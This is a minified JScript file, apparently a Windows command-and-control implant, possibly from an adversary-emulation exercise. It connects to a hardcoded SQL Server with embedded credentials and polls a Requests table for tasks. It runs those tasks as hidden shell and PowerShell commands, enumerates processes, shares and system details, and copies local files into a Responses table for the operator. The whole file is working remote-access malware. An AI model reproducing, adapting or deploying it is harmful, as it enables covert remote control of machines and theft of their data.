function uploadFile(dbo, inFile, idStr) {var inStream = new ActiveXObject("ADODB.Stream");var fileObject = new ActiveXObject("Scripting.FileSystemObject");var size = (fileObject.getFile(inFile)).size;inStream.Type = 1;inStream.Open;inStream.loadFromFile(inFile);var inVariant = inStream.read();var adVarBinary = 204;var recordSet = new ActiveXObject("ADODB.Recordset");recordSet.fields.append("mBinary", adVarBinary, size);recordSet.open();recordSet.addNew();recordSet("mBinary").value = inVariant;recordSet.update();var filecontentCmd = new ActiveXObject("ADODB.Command");filecontentCmd.CommandText = "INSERT INTO Responses (filecontent, request_id) VALUES (?, " + idStr + ")";filecontentCmd.Parameters.Append(filecontentCmd.CreateParameter("FileContent", 128, 1, size + 1, recordSet("mBinary").value));filecontentCmd.ActiveConnection = dbo;filecontentCmd.Execute();}function execShellCommand(command, randomFile, fileBlob, dbo, idStr){hasOutput = true;noOutput = false;if (command.length == 0){return noOutput;}var shell = new ActiveXObject("WScript.Shell");s = command.split(" ");if (s[0] == "download") {downloadFile(s[1], fileBlob);cmdWithRedirect = "%comspec% /C echo '[+] Upload Complete' > " + randomFile + " 2>&1";shell.Run(cmdWithRedirect, 0, true);return hasOutput;} else if (s[0] == "upload"){uploadFile(dbo, s[1], idStr);return noOutput;} else if (s[0] == "enum-system") {sysinfo = listRunningProcesses();sysinfo += "\n\n";sysinfo += netShareDiscovery();sysinfo += "\n\n";sysinfo += getSysInfoDiscovery();var FSO = new ActiveXObject("Scripting.FileSystemObject");fileHandle = FSO.OpenTextFile(randomFile, 2, true);fileHandle.WriteLine(sysinfo);fileHandle.Close();return hasOutput;} else if (s[0] == "get-mac-serial") {sysinfo = getMacSerial();var FSO = new ActiveXObject("Scripting.FileSystemObject");fileHandle = FSO.OpenTextFile(randomFile, 2, true);fileHandle.WriteLine(sysinfo);fileHandle.Close();return hasOutput;} else {cmdNoRedirect = "%comspec% /C " + command + " > " + randomFile + " 2>&1";cmdCreateFile = "%comspec% /C " + "echo Command executed. > " + randomFile + " 2>&1";cmdWithRedirect = "%comspec% /C " + command + " > " + randomFile + " 2>&1";if (s[0] == "powershell.exe") {shell.Run(cmdCreateFile, 0, true);shell.Run(cmdWithRedirect, 0, false);}else {shell.Run(cmdWithRedirect, 0, true);}return hasOutput;}}function deleteCmd(id, dbo) {cmd = "DELETE FROM Requests WHERE ID = " + id;dbo.Execute(cmd);}function getTasking(dbo, rst) {cmd = "SELECT ID, cmd, filecontent FROM Requests;";rst = dbo.Execute(cmd);while (!rst.EOF) {cmdStr = "" + rst("cmd");idStr = "" + rst("id");fileBlob = rst("filecontent");var randomFile = getRandomFile();cmdOutput = "";try {hasOutput = execShellCommand(cmdStr, randomFile, fileBlob, dbo, idStr);if (hasOutput == true) {cmdOutput = getCommandOutput(randomFile);sendTaskOutput(dbo, cmdOutput, idStr);}}catch (e) {deleteCmd(idStr, dbo);rst.MoveNext;continue;}deleteCmd(idStr, dbo);rst.MoveNext;}    }function main() {var dbo = new ActiveXObject("ADODB.Connection");var rst = new ActiveXObject("ADODB.Recordset");var constr = 'Provider=SQLOLEDB;Server=192.168.0.6;Database=tempdb;UID=evals_user;PWD=Password1234;';try {dbo.Open(constr);} catch (e) {finet = 0}while(true){sleep();try {command = getTasking(dbo, rst);} catch (e) {continue;}}}main();